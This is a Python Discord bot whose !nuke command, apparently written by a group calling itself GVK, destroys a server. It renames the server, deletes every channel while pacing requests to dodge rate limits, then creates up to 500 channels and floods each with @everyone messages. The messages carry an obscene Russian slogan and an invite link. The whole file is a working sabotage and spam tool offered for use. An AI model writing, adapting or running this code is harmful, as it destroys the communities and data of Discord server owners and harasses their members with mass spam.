import discord
from discord.ext import commands
import asyncio
import random

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')

@bot.command()
async def nuke(ctx):
    await ctx.send("**nonerp ebet**")
    
    guild = ctx.guild
    
    # 1. МЕНЯЕМ НАЗВАНИЕ
    try:
        await guild.edit(name="OWNED BY GVK")
        print("✅ Название изменено")
    except:
        print("❌ Не удалось изменить название")
    
    # 2. УДАЛЯЕМ КАНАЛЫ (оптимальная скорость без варнингов)
    print("🗑️ Удаление каналов...")
    
    deleted = 0
    skipped = 0
    channels = list(guild.channels)
    total = len(channels)
    
    for i, channel in enumerate(channels):
        try:
            await channel.delete()
            deleted += 1
            print(f"   ✅ [{i+1}/{total}] Удален: #{channel.name}")
            
            # Интеллектуальные паузы
            if (i + 1) % 3 == 0:
                await asyncio.sleep(0.2)  # После каждых 3 каналов
            elif (i + 1) % 10 == 0:
                await asyncio.sleep(0.5)  # После каждых 10 каналов
            
        except discord.Forbidden:
            print(f"   ⚠️ Нет прав: #{channel.name}")
            skipped += 1
        except discord.HTTPException as e:
            if "59074" in str(e):
                print(f"   🛡️ Защищенный канал (пропущен): #{channel.name}")
                skipped += 1
            else:
                print(f"   ❌ Ошибка: {e}")
                skipped += 1
        except Exception as e:
            print(f"   ❌ Ошибка: #{channel.name} - {e}")
            skipped += 1
        
        # Основная пауза между каналами
        await asyncio.sleep(0.05)
    
    print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
    
    # Пауза перед созданием
    print("⏳ Пауза 3 секунды...")
    await asyncio.sleep(3)
    
    # 3. СОЗДАЕМ МАКСИМАЛЬНОЕ КОЛИЧЕСТВО КАНАЛОВ
    print("🔥 Создание каналов и отправка 5 сообщений...")
    
    SPAM_TEXT = """@everyone
**ТРАХНУТЫ BY GVK**


https://discord.gg/HTr7pU7ttZ

ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ЦАРЯМИ GVK
"""
    
    # Создаем каналы пока не упремся в лимит
    max_channels = 500  # Максимум попыток
    created = 0
    failed = 0
    rate_limit_waits = 0
    
    for i in range(max_channels):
        try:
            # Создаем канал
            ch = await guild.create_text_channel(f"gvk-nuked-{created+1}")
            created += 1
            
            # Отправляем 5 сообщений
            for j in range(5):
                await ch.send(SPAM_TEXT)
                await asyncio.sleep(0.05)  # Микро пауза
            
            print(f"✅ [{created}/{max_channels}] Канал #{ch.name} создан (5 сообщений)")
            
            # Интеллектуальные паузы при создании
            if created % 5 == 0:
                await asyncio.sleep(0.3)  # После каждых 5 каналов
            elif created % 20 == 0:
                await asyncio.sleep(1)  # После каждых 20 каналов
            
        except discord.Forbidden:
            print(f"❌ Нет прав на создание каналов!")
            break
        except discord.HTTPException as e:
            if "rate" in str(e).lower():
                rate_limit_waits += 1
                wait_time = min(rate_limit_waits * 0.5, 5)  # Увеличиваем паузу
                print(f"⚠️ Rate limit! Ждем {wait_time} сек...")
                await asyncio.sleep(wait_time)
                continue  # Пробуем снова
            elif "maximum" in str(e).lower() or "limit" in str(e).lower():
                print(f"❌ Достигнут лимит каналов на сервере!")
                break
            else:
                print(f"❌ Ошибка: {e}")
                failed += 1
                await asyncio.sleep(1)
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            failed += 1
            await asyncio.sleep(1)
    
    print("\n" + "="*50)
    print("💀 НЬЮК ЗАВЕРШЁН 💀")
    print(f"✅ Создано каналов: {created}")
    print(f"✅ Сообщений отправлено: {created * 5}")
    print(f"❌ Ошибок создания: {failed}")
    print(f"⏱️ Rate limit пауз: {rate_limit_waits}")
    print("="*50)
    
    try:
        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано каналов: {created}\nСообщений: {created * 5}")
    except:
        pass

@bot.command()
async def status(ctx):
    await ctx.send("🔥 Бот активен! Используй !nuke")

@bot.command()
async def channels(ctx):
    """Показывает сколько каналов на сервере"""
    count = len(ctx.guild.channels)
    await ctx.send(f"📊 На сервере {count} каналов")

import os
bot.run(os.environ['TOKEN'])
